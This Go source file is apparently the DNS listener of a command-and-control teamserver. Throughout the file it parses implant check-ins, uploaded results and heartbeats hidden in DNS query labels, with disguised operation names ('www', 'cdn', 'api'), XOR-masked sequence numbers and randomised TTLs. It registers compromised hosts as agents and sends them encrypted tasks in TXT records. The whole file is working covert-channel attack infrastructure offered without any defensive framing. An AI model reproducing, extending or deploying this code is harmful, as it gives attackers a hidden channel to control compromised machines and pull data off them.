package main

import (
	"crypto/rand"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"
)

// --- Lifecycle ---

func (t *TransportDNS) Start(ts Teamserver) error {
	addr := formatAddr(t.Config.HostBind, t.Config.PortBind)

	mux := dns.NewServeMux()
	mux.HandleFunc(".", t.handleDNS)

	server := &dns.Server{Addr: addr, Net: "udp", Handler: mux}

	go func() {
		logf("starting DNS listener on %s (domains: %v)", addr, t.Config.Domains)
		if err := server.ListenAndServe(); err != nil {
			logf("DNS server error: %v", err)
		}
	}()

	t.Active = true

	// Cleanup goroutine
	go func() {
		ticker := time.NewTicker(60 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			if !t.Active {
				return
			}
			t.cleanup()
		}
	}()

	return nil
}

func (t *TransportDNS) Stop() error {
	t.Active = false
	return nil
}

func (t *TransportDNS) cleanup() {
	t.mu.Lock()
	defer t.mu.Unlock()

	now := time.Now()
	for k, v := range t.upFrags {
		if now.Sub(v.lastUpdate) > 5*time.Minute {
			delete(t.upFrags, k)
		}
	}
	for k, v := range t.downFrags {
		if now.Sub(v.lastUpdate) > 10*time.Minute {
			delete(t.downFrags, k)
		}
	}
}

// --- DNS Handler ---

func (t *TransportDNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	baseTTL := uint32(t.Config.TTL)
	if baseTTL == 0 {
		baseTTL = 10
	}
	ttl := baseTTL + uint32(t.rng.IntN(60))

	for _, q := range r.Question {
		req := t.parseRequest(q)

		switch req.op {
		case "HI":
			resp := t.handleHI(req, w)
			if resp != nil {
				m.Answer = append(m.Answer, t.buildDataResponse(req, resp, ttl))
			} else {
				m.Answer = append(m.Answer, t.buildSimpleAck(req, ttl))
			}

		case "PUT":
			var ack putAckInfo
			if len(req.data) > 0 {
				ack = t.handlePUT(req)
			}
			m.Answer = append(m.Answer, t.buildPutAckResponse(req, ack, ttl))

		case "GET":
			frame := t.handleGET(req, w)
			m.Answer = append(m.Answer, t.buildDataResponse(req, frame, ttl))

		case "HB":
			_, hasPending := t.handleHB(req)
			m.Answer = append(m.Answer, t.buildHBResponse(req, hasPending, ttl))

		default:
			m.Answer = append(m.Answer, &dns.TXT{
				Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
				Txt: []string{"OK"},
			})
		}
	}

	_ = w.WriteMsg(m)
}

// --- Request Parsing ---

func (t *TransportDNS) parseRequest(q dns.Question) *dnsRequest {
	labels := dns.SplitDomainName(q.Name)
	base := labels

	// Strip domain labels
	if len(t.Config.Domains) > 0 {
		for i := range labels {
			tail := strings.ToLower(strings.Join(labels[i:], "."))
			for _, dom := range t.Config.Domains {
				if tail == dom {
					base = labels[:i]
					break
				}
			}
			if len(base) < len(labels) {
				break
			}
		}
	}

	req := &dnsRequest{qtype: q.Qtype, qname: q.Name}

	if len(base) < 5 {
		return req
	}

	req.sid = strings.ToLower(base[0])
	rawOp := strings.ToLower(base[1])

	switch rawOp {
	case "www", "hi":
		req.op = "HI"
	case "cdn", "put":
		req.op = "PUT"
	case "api", "get":
		req.op = "GET"
	case "hb":
		req.op = "HB"
	}

	if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
		req.seq = int(v ^ uint64(seqXorMask))
	}

	dataLabel := strings.ToUpper(strings.Join(base[4:], ""))
	enc := base32.StdEncoding.WithPadding(base32.NoPadding)
	if db, err := enc.DecodeString(dataLabel); err == nil {
		req.data = db
	}

	// Validate SID is 8 hex chars
	if match, _ := regexp.MatchString("^[0-9a-fA-F]{8}$", req.sid); !match {
		req.op = ""
	}

	return req
}

// --- HI Handler (Checkin) ---

func (t *TransportDNS) handleHI(req *dnsRequest, w dns.ResponseWriter) []byte {
	// Check pending checkin from PUT fragments
	t.mu.Lock()
	pending, hasPending := t.pendingCheckins[req.sid]
	if hasPending {
		delete(t.pendingCheckins, req.sid)
	}
	t.mu.Unlock()

	var data []byte
	if hasPending {
		data = pending
	} else {
		data = req.data
	}

	if len(data) < 52 {
		return nil
	}

	totalLen := len(data)
	agentUUID := data[:36]
	agentIDStr := string(agentUUID[:8])
	extractedKey := data[totalLen-16:]

	// Save encryption key
	_ = ModuleObject.ts.TsExtenderDataSave(t.Name, "key_"+agentIDStr, extractedKey)

	// Decrypt payload
	encryptedPayload := data[36 : totalLen-16]
	var decryptedPayload []byte
	if len(encryptedPayload) > 0 {
		crypt := NewLokyCrypt(extractedKey, extractedKey)
		decryptedPayload = crypt.Decrypt(encryptedPayload)
	}

	// Register with teamserver
	tsAgentId := agentIDStr
	if !ModuleObject.ts.TsAgentIsExists(agentIDStr) {
		externalIP := ""
		if w != nil && w.RemoteAddr() != nil {
			host, _, _ := net.SplitHostPort(w.RemoteAddr().String())
			externalIP = host
		}
		agentData, err := ModuleObject.ts.TsAgentCreate("c17a905a", agentIDStr, decryptedPayload, t.Name, externalIP, true)
		if err != nil {
			logf("failed to create agent %s: %v", agentIDStr, err)
			return nil
		}
		// The teamserver may assign a different ID than what we passed
		if agentData.Id != "" {
			tsAgentId = agentData.Id
		}
		logf("agent %s registered as %s in teamserver", agentIDStr, tsAgentId)

		// Save SID→tsAgentId mapping + key for the TS ID
		_ = ModuleObject.ts.TsExtenderDataSave(t.Name, "key_"+tsAgentId, extractedKey)
	}
	_ = ModuleObject.ts.TsAgentSetTick(tsAgentId, t.Name)

	// Build response using the TEAMSERVER agent ID (agent will adopt this as its new SID)
	randomID := make([]byte, 19)
	_, _ = rand.Read(randomID)
	newID := []byte(tsAgentId + hex.EncodeToString(randomID))

	crypt := NewLokyCrypt(extractedKey, extractedKey)
	encryptedNewID := crypt.Encrypt(newID)
	return append(agentUUID, encryptedNewID...)
}

// --- PUT Handler ---

func (t *TransportDNS) handlePUT(req *dnsRequest) putAckInfo {
	ack := putAckInfo{}
	if len(req.data) == 0 {
		return ack
	}

	if req.sid != "" {
		_ = ModuleObject.ts.TsAgentSetTick(req.sid, t.Name)
	}

	data := req.data

	// Check for Meta V1 header
	metaFlags, _, rest, hasMeta := parseMetaV1(data)
	if hasMeta {
		_ = metaFlags
		data = rest
	}

	if len(data) <= 8 {
		return ack
	}

	total := binary.BigEndian.Uint32(data[0:4])
	offset := binary.BigEndian.Uint32(data[4:8])
	chunk := data[8:]

	if total == 0 || total > maxUploadSize {
		return ack
	}

	ack.total = total

	// Single-fragment complete
	if offset == 0 && total <= uint32(len(chunk)) {
		ack.complete = true
		ack.filled = total
		ack.nextExpectedOff = total

		// Process for registered agents
		if ModuleObject.ts.TsAgentIsExists(req.sid) {
			completeBuf := make([]byte, total)
			copy(completeBuf, chunk[:total])
			t.processPutComplete(req.sid, completeBuf)
		}
		return ack
	}

	// Multi-fragment assembly
	t.mu.Lock()

	fb, ok := t.upFrags[req.sid]
	if !ok || fb.total != total || (offset == 0 && fb.highWater > 0) {
		fb = newFragBuf(total)
		t.upFrags[req.sid] = fb
	}

	chunkLen := uint32(len(chunk))
	if fb.chunkSize == 0 && chunkLen > 0 {
		fb.chunkSize = chunkLen
	}

	if offset >= fb.total || fb.seenOffsets[offset] {
		ack.lastReceivedOff = fb.lastReceivedOff
		ack.nextExpectedOff = computeNextExpectedOffset(fb)
		ack.filled = fb.filled
		t.mu.Unlock()
		return ack
	}

	end := offset + chunkLen
	if end > fb.total {
		end = fb.total
	}
	n := end - offset
	copy(fb.buf[offset:end], chunk[:n])

	fb.seenOffsets[offset] = true
	fb.filled += n
	fb.lastReceivedOff = offset
	fb.lastUpdate = time.Now()
	if end > fb.highWater {
		fb.highWater = end
	}

	fb.nextExpectedOff = computeNextExpectedOffset(fb)
	ack.lastReceivedOff = fb.lastReceivedOff
	ack.nextExpectedOff = fb.nextExpectedOff
	ack.filled = fb.filled

	var completeBuf []byte
	if fb.filled >= fb.total {
		completeBuf = make([]byte, len(fb.buf))
		copy(completeBuf, fb.buf)
		delete(t.upFrags, req.sid)
		ack.complete = true
	}
	t.mu.Unlock()

	if completeBuf != nil {
		t.processPutComplete(req.sid, completeBuf)
	}

	return ack
}

// processPutComplete handles a fully reassembled PUT payload
func (t *TransportDNS) processPutComplete(sid string, completeBuf []byte) {
	logf("PUT complete: sid=%s len=%d", sid, len(completeBuf))

	agentRegistered := ModuleObject.ts.TsAgentIsExists(sid)
	if !agentRegistered {
		logf("PUT complete: new agent %s, storing as pending checkin", sid)
		t.mu.Lock()
		t.pendingCheckins[sid] = completeBuf
		t.mu.Unlock()
		return
	}

	if len(completeBuf) <= 36 {
		logf("PUT complete: too short (%d <= 36)", len(completeBuf))
		return
	}

	encryptedPayload := completeBuf[36:]
	keyBytes, kerr := ModuleObject.ts.TsExtenderDataLoad(t.Name, "key_"+sid)
	if kerr != nil || len(keyBytes) != 16 {
		logf("PUT complete: key load failed for %s (err=%v keyLen=%d)", sid, kerr, len(keyBytes))
		return
	}

	crypt := NewLokyCrypt(keyBytes, keyBytes)
	decrypted := crypt.Decrypt(encryptedPayload)
	if len(decrypted) == 0 {
		logf("PUT complete: decrypt returned empty")
		return
	}

	action := decrypted[0]
	logf("PUT complete: agent=%s action=0x%x decryptedLen=%d", sid, action, len(decrypted))

	// Match HTTP listener's exact data handling (pl_http.go lines 814-867)
	switch action {
	case TASK_GET:
		logf("PUT complete: TASK_GET (ignored)")
	case TASK_RESULT:
		if len(decrypted) > 1 {
			logf("PUT complete: TASK_RESULT -> TsAgentProcessData(%d bytes)", len(decrypted)-1)
			err := ModuleObject.ts.TsAgentProcessData(sid, decrypted[1:])
			if err != nil {
				logf("PUT complete: TsAgentProcessData error: %v", err)
			}
		}
	case TASK_OUT, TASK_QUICK:
		wrapped := append([]byte{0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0}, decrypted...)
		logf("PUT complete: TASK_QUICK/OUT -> TsAgentProcessData(%d bytes)", len(wrapped))
		err := ModuleObject.ts.TsAgentProcessData(sid, wrapped)
		if err != nil {
			logf("PUT complete: TsAgentProcessData error: %v", err)
		}
	default:
		logf("PUT complete: unknown action 0x%x", action)
		_ = ModuleObject.ts.TsAgentProcessData(sid, decrypted)
	}
}

// --- GET Handler ---

func (t *TransportDNS) handleGET(req *dnsRequest, w dns.ResponseWriter) []byte {
	if req.sid != "" {
		_ = ModuleObject.ts.TsAgentSetTick(req.sid, t.Name)
	}

	var reqOffset uint32
	if len(req.data) >= 4 {
		reqOffset = binary.BigEndian.Uint32(req.data[0:4])
	}

	keyBytes, _ := ModuleObject.ts.TsExtenderDataLoad(t.Name, "key_"+req.sid)

	t.mu.Lock()
	df, exists := t.downFrags[req.sid]
	hasExisting := exists && df != nil
	if hasExisting {
		df.lastUpdate = time.Now()
	}
	t.mu.Unlock()

	// If an existing download is in progress AND the request is within its range,
	// serve it (including the final chunk). Only after the final chunk is delivered
	// will the NEXT request trigger deletion and new-task fetch.
	if hasExisting && reqOffset < df.total {
		chunk := t.buildResponseChunk(df, reqOffset)
		// Track progress: if this was the last chunk, mark complete
		t.mu.Lock()
		maxChunk := uint32(dnsSafeChunkSize)
		remaining := df.total - reqOffset
		if remaining <= maxChunk {
			df.off = df.total
		} else if reqOffset+maxChunk > df.off {
			df.off = reqOffset + maxChunk
		}
		t.mu.Unlock()
		return chunk
	}

	// Existing download is complete (or doesn't exist): delete it and fetch new tasks
	if hasExisting && df.off >= df.total {
		t.mu.Lock()
		delete(t.downFrags, req.sid)
		t.mu.Unlock()
		df = nil
	}

	taskData, err := ModuleObject.ts.TsAgentGetHostedAll(req.sid, int(maxDownloadSize))
	if err == nil && len(taskData) > 0 {
		uuid := make([]byte, 36)
		copy(uuid, []byte(req.sid))
		crypt := NewLokyCrypt(keyBytes, keyBytes)
		encrypted := crypt.Encrypt(taskData)
		wrapped := append(uuid, encrypted...)

		nonce := newTaskNonce()
		df = newDownBuf(wrapped, nonce)
		t.mu.Lock()
		t.downFrags[req.sid] = df
		t.mu.Unlock()
		// New download: agent should request from offset 0
		return t.buildResponseChunk(df, 0)
	}

	return t.buildResponseChunk(df, reqOffset)
}

// --- HB Handler ---

func (t *TransportDNS) handleHB(req *dnsRequest) (needsReset bool, hasPendingTasks bool) {
	if req.sid != "" {
		_ = ModuleObject.ts.TsAgentSetTick(req.sid, t.Name)
	}

	t.mu.Lock()
	df, hasDf := t.downFrags[req.sid]
	if hasDf && df != nil {
		df.lastUpdate = time.Now()
		if df.total > 0 && df.off >= df.total {
			delete(t.downFrags, req.sid)
			df = nil
			hasDf = false
		}
	}
	t.mu.Unlock()

	if !hasDf || df == nil {
		taskData, err := ModuleObject.ts.TsAgentGetHostedAll(req.sid, int(maxDownloadSize))
		logf("HB fetchTasks(%s): err=%v len=%d", req.sid, err, len(taskData))
		if err == nil && len(taskData) > 0 {
			keyBytes, _ := ModuleObject.ts.TsExtenderDataLoad(t.Name, "key_"+req.sid)
			if len(keyBytes) == 16 {
				uuid := make([]byte, 36)
				copy(uuid, []byte(req.sid))
				crypt := NewLokyCrypt(keyBytes, keyBytes)
				encrypted := crypt.Encrypt(taskData)
				wrapped := append(uuid, encrypted...)
				nonce := newTaskNonce()
				t.mu.Lock()
				t.downFrags[req.sid] = newDownBuf(wrapped, nonce)
				t.mu.Unlock()
				hasPendingTasks = true
			}
		}
	} else {
		hasPendingTasks = true
	}

	return needsReset, hasPendingTasks
}

// --- Response Builders ---

func (t *TransportDNS) buildResponseChunk(df *dnsDownBuf, reqOffset uint32) []byte {
	if df == nil || df.total == 0 {
		return nil
	}

	if reqOffset >= df.total {
		reqOffset = 0
	}

	maxChunk := uint32(dnsSafeChunkSize)
	remaining := df.total - reqOffset
	chunkLen := remaining
	if chunkLen > maxChunk {
		chunkLen = maxChunk
	}

	// Frame: [total:4][offset:4][data]
	frame := make([]byte, 8+chunkLen)
	binary.BigEndian.PutUint32(frame[0:4], df.total)
	binary.BigEndian.PutUint32(frame[4:8], reqOffset)
	copy(frame[8:], df.buf[reqOffset:reqOffset+chunkLen])
	return frame
}

func (t *TransportDNS) buildDataResponse(req *dnsRequest, data []byte, ttl uint32) dns.RR {
	if data == nil {
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{""},
		}
	}

	encoded := base64.StdEncoding.EncodeToString(data)

	// Split into 255-byte chunks for TXT records
	var chunks []string
	for len(encoded) > 0 {
		n := len(encoded)
		if n > 255 {
			n = 255
		}
		chunks = append(chunks, encoded[:n])
		encoded = encoded[n:]
	}

	return &dns.TXT{
		Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
		Txt: chunks,
	}
}

func (t *TransportDNS) buildSimpleAck(req *dnsRequest, ttl uint32) dns.RR {
	return &dns.A{
		Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
		A:   net.IP{0, 0, 0, 0},
	}
}

func (t *TransportDNS) buildPutAckResponse(req *dnsRequest, ack putAckInfo, ttl uint32) dns.RR {
	ip := make(net.IP, 4)
	var flags byte
	if ack.complete {
		flags |= 0x01
	}
	if ack.needsReset {
		flags |= 0x02
	}
	ip[0] = flags
	ip[1] = byte((ack.nextExpectedOff >> 16) & 0xFF)
	ip[2] = byte((ack.nextExpectedOff >> 8) & 0xFF)
	ip[3] = byte(ack.nextExpectedOff & 0xFF)
	return &dns.A{
		Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
		A:   ip,
	}
}

func (t *TransportDNS) buildHBResponse(req *dnsRequest, hasPendingTasks bool, ttl uint32) dns.RR {
	ip := make(net.IP, 4)
	if hasPendingTasks {
		ip[0] = 0x01
	}
	return &dns.A{
		Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
		A:   ip,
	}
}

func init() {
	_ = fmt.Sprintf // suppress unused import
}
